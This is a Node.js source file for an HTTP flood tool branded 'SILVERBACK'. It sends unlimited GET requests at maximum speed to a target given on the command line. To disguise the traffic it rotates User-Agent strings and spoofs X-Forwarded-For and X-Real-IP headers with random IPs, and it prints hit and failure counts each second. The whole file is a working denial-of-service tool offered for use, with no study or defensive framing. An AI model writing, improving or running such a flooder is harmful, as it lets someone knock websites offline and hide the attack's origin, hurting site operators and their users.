const http = require('http');
const fs = require('fs');

// Load User-Agents from ua.txt file
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

// Stats
let totalRequests = 0;
let successfulRequests = 0;
let failedRequests = 0;

// Function to get a random User-Agent from the list
function getRandomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Generate a random IP for spoofing
function generateRandomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

// Stealth headers to disguise the requests
function getSpoofedHeaders() {
  return {
    'User-Agent': getRandomUserAgent(),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'X-Forwarded-For': generateRandomIP(), // Spoofed IP
    'X-Real-IP': generateRandomIP(), // Another spoofed IP
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'Range': 'bytes=0-1000',
    'TE': 'Trailers',
  };
}

// Send HTTP request
function sendRequest(target) {
  const options = {
    hostname: target,
    port: 80, // Use HTTP 1.1 on port 80
    path: '/',
    method: 'GET',
    headers: getSpoofedHeaders(),
  };

  const req = http.request(options, (res) => {
    if (res.statusCode >= 200 && res.statusCode < 400) {
      successfulRequests++;
    } else {
      failedRequests++;
    }

    totalRequests++;
  });

  req.on('error', (error) => {
    failedRequests++;
    totalRequests++;
  });

  req.end();
}

// Log stats every second
function logStats() {
  setInterval(() => {
    console.clear(); // Clear terminal to avoid spam
    console.log('SILVERBACK');
    console.log('==========');
    console.log(`TOTAL - ${totalRequests}`);
    console.log(`HIT - ${successfulRequests}`);
    console.log(`KXX - ${failedRequests}`);
    console.log('=============================');
  }, 1000); // Update stats every second
}

// Flood the target with continuous requests
function startFlood(target) {
  if (!target) {
    console.error('Usage: node flooder.js <target_url>');
    process.exit(1);
  }

  logStats(); // Start logging stats

  // Continuously send requests without any limit
  setInterval(() => {
    sendRequest(target); // Send the request
  }, 0); // No interval, maximum speed
}

// Start the flood with the target URL passed as a command argument
const target = process.argv[2];
startFlood(target); // Flood the target indefinitely
